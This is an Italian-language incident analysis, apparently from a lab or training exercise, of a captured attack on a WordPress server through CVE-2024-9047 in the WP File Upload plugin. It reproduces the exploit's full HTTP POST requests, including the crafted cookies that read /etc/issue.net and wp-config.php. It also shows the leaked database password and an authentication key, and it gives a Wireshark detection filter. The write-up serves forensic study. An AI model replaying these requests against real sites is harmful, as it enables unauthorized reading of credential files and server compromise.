# CVE-2024-9047 - (58.16.78.90 -> 192.168.100.101:80)

Flussi TCP confermano un’azione potenzialmente malevola da parte di un attore che cerca di ottenere infomrazioni sul plugin **WP File Upload**. Le richieste analizzate indicano un chiaro tentativo di ricognizione iniziale, seguito da un exploit mirato volto a esfiltrare file sensibili dal server.


## When

| **Evento**                     | **Timestamp** | **TCP Stream** | **Dettagli**                                   |
|--------------------------------|---------------|----------------|----------------------------------------------- |
| Raccolta di infomrazioni       | 22:42:09:94   | 10             | GET /wp-content/plugins/wp-file-upload/                   |
| Primo exploit                 | 22:43:34:29   | 193             | POST /wp-content/plugins/wp-file-upload/                   |
| Secondo exploit               | 22:43:43:57   | 215             | POST /wp-content/plugins/wp-file-upload/                   |

## Who/Where

| **Ruolo**         | **Indirizzo IP**       | **Porta**       |
|--------------------|------------------------|-----------------|
| Attaccante         | 58.16.78.90           | 34970,49736,46892   |
| Server compromesso | 192.168.100.101       | 80 (srv-www)    |


## What

1. L’attaccante ha identificato la presenza del plugin **wp-file-upload** e la sua versione.

```sh
GET /wp-content/plugins/wp-file-upload/css/wordpress_file_upload_style.css?ver=6.8
GET /wp-content/plugins/wp-file-upload/css/wordpress_file_upload_adminbarstyle.css?ver=6.8
GET /wp-content/plugins/wp-file-upload/vendor/jquery/jquery-ui-timepicker-addon.min.js?ver=6.8
```

2. Exploit sull inforkazioni del SO

```sh
POST /wp-content/plugins/wp-file-upload/wfu_file_downloader.php HTTP/1.1
Host: www.potenzio.com
User-Agent: python-requests/2.32.3
...
Cookie: wp_wpfileupload_testupload=Nxploited; wfu_storage_file123=/etc/issue.net; wfu_download_ticket_ticket123=9876543210987; wfu_ABSPATH=/
...
file=file123&ticket=ticket123&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_testupload
```

3. Exploit sull infomrazioni di configurazione

```sh
POST /wp-content/plugins/wp-file-upload/wfu_file_downloader.php HTTP/1.1
Host: www.potenzio.com
User-Agent: python-requests/2.32.3
....
Cookie: wp_wpfileupload_testupload=Nxploited; wfu_storage_file123=/var/www/html/wp-config.php; wfu_download_ticket_ticket123=9876543210987; wfu_ABSPATH=/
....
file=file123&ticket=ticket123&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_testupload
```

Contenuto esfiltrato:

```php
// ** Database settings//

define( 'DB_NAME', 'wpdb' ); /** The name of the database for WordPress */
define( 'DB_USER', 'wp' ); /** Database username */
define( 'DB_PASSWORD', 'secret4wp' ); /** Database password */
define( 'DB_HOST', '10.0.100.100' ); /** Database hostname */
define( 'DB_CHARSET', 'utf8mb4' ); /** Database charset to use in creating database tables. */
define( 'DB_COLLATE', '' ); /** The database collate type. Don't change this if in doubt. */

/**
 * Authentication unique keys and salts.
 */
define( 'AUTH_KEY','*&xb-+qX)0]kRKF@-Y  Oig}y6f,QBVws)B:sDUA=yEJK.<;4eJ.Ay~g1EfrX-uI' );
...
```

## How
L'attaccante ha sfruttato la vulberabilità [CVE-2024-9047](https://nvd.nist.gov/vuln/detail/cve-2024-9047)
basata su:

- Manipolazione della richiesta HTTP
Il client ha inviato una richiesta POST a wfu_file_downloader.php, simulando un'operazione di download legittima.
Tuttavia, ha incluso parametri dannosi come wfu_storage_file123=/var/www/html/wp-config.php, forzando il server a restituire il file di configurazione.
- Abuso dei cookie di sessione
Il client ha utilizzato cookie speciali (wp_wpfileupload_testupload=Nxploited) e un ticket di download (wfu_download_ticket_ticket123=9876543210987) per aggirare i controlli di autorizzazione del plugin e ottenere accesso non autorizzato.

## Why

Esfiltrazione dei file di configurazione del database WordPress, contenenti:

- Credenziali di accesso (username e password)
- Informazioni di connessione al DB
- Chiavi di autenticazione e salt WordPress


**Filtri Wireshark utilizzati**

```bash
http.request.method == "POST" && http.request.uri contains "/wp-content/plugins/wp-file-upload/"
```